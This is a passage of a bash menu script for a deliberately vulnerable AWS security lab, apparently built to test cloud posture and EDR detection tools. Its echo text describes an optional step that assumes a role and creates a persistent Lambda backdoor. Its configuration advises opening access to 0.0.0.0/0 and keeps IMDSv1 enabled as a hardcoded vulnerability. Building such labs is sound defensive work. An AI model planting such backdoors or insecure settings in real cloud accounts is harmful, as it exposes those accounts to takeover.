  echo "${BOLD}Backdoor Creation:${RESET}"
  if [[ "${ciem_mode}" == "--execute" ]]; then
    echo "• ${RED}PERFORMS REAL AWS ACTIONS:${RESET} AssumeRole → Create Lambda function"
    echo "• Creates persistent backdoor: ${BOLD}cnappuccino-backdoor-test${RESET}"
  else
    echo "• ${YELLOW}SIMULATES:${RESET} AssumeRole → Create Lambda function"
    echo "• Would create persistent backdoor: ${BOLD}cnappuccino-backdoor-test${RESET}"
  fi
  echo "• Lambda function provides persistent access independent of original compromise"
  echo "• Demonstrates cloud privilege escalation (EC2 → Lambda Admin)"
  echo ""
  echo "${GREEN}✅ CIEM privilege escalation simulation complete${RESET}"
  echo ""
  
  echo "${GREEN}✅ Runtime exploitation suite complete!${RESET}"
  echo ""
  echo "${BOLD}Your EDR/XDR should have detected:${RESET}"
  echo "• Suspicious HTTP User-Agent headers"
  echo "• Remote command execution patterns"
  echo "• File system enumeration activities" 
  echo "• Credential access attempts"
  echo "• Privilege escalation simulations"
}

get_soak_hours() {
  local tfvars_file="$TF_DIR/terraform.tfvars"
  if [[ ! -f "$tfvars_file" ]]; then
    echo "0"
    return
  fi
  
  local deploy_time; deploy_time=$(stat -c %Y "$tfvars_file" 2>/dev/null || stat -f %m "$tfvars_file" 2>/dev/null || echo "0")
  local current_time; current_time=$(date +%s)
  local elapsed=$((current_time - deploy_time))
  echo $((elapsed / 3600))
}

view_testing_guide() {
  headline "CSPM Testing Guide" "Comprehensive testing procedures and validation"
  
  if [[ -f "$ROOT_DIR/TESTING.md" ]]; then
    echo "Opening TESTING.md in your default viewer..."
    if command -v open >/dev/null 2>&1; then
      open "$ROOT_DIR/TESTING.md"  # macOS
    elif command -v xdg-open >/dev/null 2>&1; then
      xdg-open "$ROOT_DIR/TESTING.md"  # Linux
    else
      echo "View the testing guide at: ${BOLD}$ROOT_DIR/TESTING.md${RESET}"
    fi
  else
    echo "${YELLOW}TESTING.md not found in repository${RESET}"
  fi
  
  echo ""
  echo "The testing guide includes:"
  echo "• Step-by-step vulnerability validation"
  echo "• OWASP Top 10 and MITRE ATT&CK mappings"
  echo "• Compliance framework testing (PCI DSS, SOX, HIPAA)"
  echo "• Real-time detection scenarios"
  echo "• Expected findings and remediation guidance"
}

# -----------------------------
# Main menu
# -----------------------------
main_menu() {
   # Remove clear to preserve terminal history between menu reloads
   banner

   # Pre-fetch Terraform outputs (deduplication)
   local _ip _iid _sg _ssh
   _ip=$(terraform_output_raw public_ip)
   _iid=$(terraform_output_raw instance_id)
   _sg=$(terraform_output_raw security_group_id)
   _ssh=$(terraform_output_raw ssh_command)

   # Show current status with enhanced soak status display
   local status_line soak_status_txt soak_indicator deployment_status
   deployment_status="$(check_deployment_status)"

   if [[ -n "$_ip" && "$deployment_status" == "completed"* ]]; then
     status_line="${GREEN}✅ Running${RESET} (${_ip}) - ${GREEN}Deployment Complete${RESET}"
   elif [[ -n "$_ip" && "$deployment_status" == "deploying"* ]]; then
     local phase_info="${deployment_status//deploying/}"
     status_line="${YELLOW}🚀 Deploying${RESET} (${_ip}) - ${YELLOW}User Data Running ${phase_info}${RESET}"
   elif [[ -n "$_ip" && "$deployment_status" == "failed" ]]; then
     status_line="${RED}❌ Failed${RESET} (${_ip}) - ${RED}Bootstrap Failed${RESET}"
   elif [[ -n "$_ip" ]]; then
     status_line="${YELLOW}⚡ Running${RESET} (${_ip}) - ${YELLOW}Status Unknown${RESET}"
   else
     status_line="${YELLOW}⏸ No lab running${RESET}"
   fi

   soak_status_txt="$(get_soak_time)"
   soak_indicator=""
   if [[ "$soak_status_txt" == *"Ready for Stage 2"* ]]; then
     soak_indicator="✅"
   elif [[ "$soak_status_txt" == *"Soaking"* ]]; then
     soak_indicator="⚠️"
   else
     soak_indicator="⏸"
   fi
   echo "${DIM}Status: ${status_line}   Soak: ${soak_indicator} ${soak_status_txt}${RESET}"
   echo "${DIM}Config: ${OWNER}@${REGION} | ${PURPOSE} | ${INSTANCE_TYPE} | ${ALLOWED_CIDR}${RESET}"
   echo

   export CNAPPUCCINO_MENU_IP="$_ip"
   export CNAPPUCCINO_MENU_IID="$_iid"
   export CNAPPUCCINO_MENU_SG="$_sg"
   export CNAPPUCCINO_MENU_SSH="$_ssh"
   cat <<MENU
 1) ⚙️ Lab Configuration
 2) 🚀 Deploy Lab (Stage 1)
 3) 🧪 Quick RCE Test
 4) 📊 Lab Status & Diagnostics
 5) ⚡ Multi-Stage Runtime Exploits (Stage 2)
 6) 📖 Testing Guide
 7) 💻 SSH
 8) 🧹 Cleanup
 9) 🚪 Quit
 
MENU
   read -r -p "Select option: " choice || true
   case "${choice:-}" in
     1) configure_lab_settings ;;
     2) check_deps && terraform_init && terraform_apply ;;
     3) quick_rce_test ;;
     4) lab_status_and_diagnostics ;;
     5) runtime_exploits ;;
     6) view_testing_guide; pause ;;
     7) ssh_into ;;
     8) cleanup_menu ;;
     9) exit 0 ;;
     0) exit 0 ;;
     *) echo "Invalid choice." ;;
   esac
   echo
   pause
}

configure_lab_settings() {
  headline "Configure Lab Settings" "Set AWS profile, region, lab parameters, and security options"
  log "Configuring lab settings"
  
  echo "${BOLD}Current Configuration:${RESET}"
  echo "• AWS Profile: ${BOLD}${AWS_PROFILE}${RESET}"
  echo "• Region: ${BOLD}${REGION}${RESET}"
  echo "• Owner Tag: ${BOLD}${OWNER}${RESET}"
  echo "• Purpose Tag: ${BOLD}${PURPOSE}${RESET}"
  echo "• Instance Type: ${BOLD}${INSTANCE_TYPE}${RESET}"
  echo "• Allowed CIDR: ${BOLD}${ALLOWED_CIDR}${RESET}"
  echo ""
  
  echo "${DIM}Press Enter to keep current values, or enter new values:${RESET}"
  echo ""
  
  read -r -p "AWS Profile [${AWS_PROFILE}]: " new_profile
  [[ -n "${new_profile:-}" ]] && AWS_PROFILE="$new_profile"
  
  read -r -p "AWS Region [${REGION}]: " new_region
  [[ -n "${new_region:-}" ]] && REGION="$new_region"
  
  read -r -p "Owner Tag [${OWNER}]: " new_owner
  [[ -n "${new_owner:-}" ]] && OWNER="$new_owner"
  
  read -r -p "Purpose Tag [${PURPOSE}]: " new_purpose
  [[ -n "${new_purpose:-}" ]] && PURPOSE="$new_purpose"
  
  read -r -p "Instance Type [${INSTANCE_TYPE}]: " new_instance_type
  [[ -n "${new_instance_type:-}" ]] && INSTANCE_TYPE="$new_instance_type"
  
  echo ""
  echo "${DIM}Security Settings:${RESET}"
  echo "${DIM}• 0.0.0.0/0 = Open to all (recommended for Stage 1 posture scanning)${RESET}"
  echo "${DIM}• YOUR_IP/32 = Restricted to your IP (recommended after Stage 1)${RESET}"
  read -r -p "Allowed CIDR [${ALLOWED_CIDR}]: " new_cidr
  [[ -n "${new_cidr:-}" ]] && ALLOWED_CIDR="$new_cidr"
  
  echo ""
  log "Configuration updated - Profile: ${AWS_PROFILE}, Region: ${REGION}, Owner: ${OWNER}, Purpose: ${PURPOSE}, Instance: ${INSTANCE_TYPE}, CIDR: ${ALLOWED_CIDR}"
  echo "${GREEN}✅ Configuration Updated:${RESET}"
  echo "• AWS Profile: ${BOLD}${AWS_PROFILE}${RESET}"
  echo "• Region: ${BOLD}${REGION}${RESET}"
  echo "• Owner: ${BOLD}${OWNER}${RESET}"
  echo "• Purpose: ${BOLD}${PURPOSE}${RESET}"
  echo "• Instance Type: ${BOLD}${INSTANCE_TYPE}${RESET}"
  echo "• Allowed CIDR: ${BOLD}${ALLOWED_CIDR}${RESET}"
  echo "• IMDSv1: ${BOLD}Enabled${RESET} ${DIM}(hardcoded vulnerability)${RESET}"
  echo ""
  echo "${DIM}Validate configuration and AWS account? (Y/n):${RESET}"
  read -r -p "" validate_choice
  validate_choice="${validate_choice:-Y}"
  
  if [[ "${validate_choice,,}" == "y" ]]; then
    validate_configuration_interactive
  fi
  
  echo ""
  echo "${DIM}Next Step: Use option 2 to deploy with these settings${RESET}"
}

# -----------------------------
# Entry
# -----------------------------
while true; do main_menu; done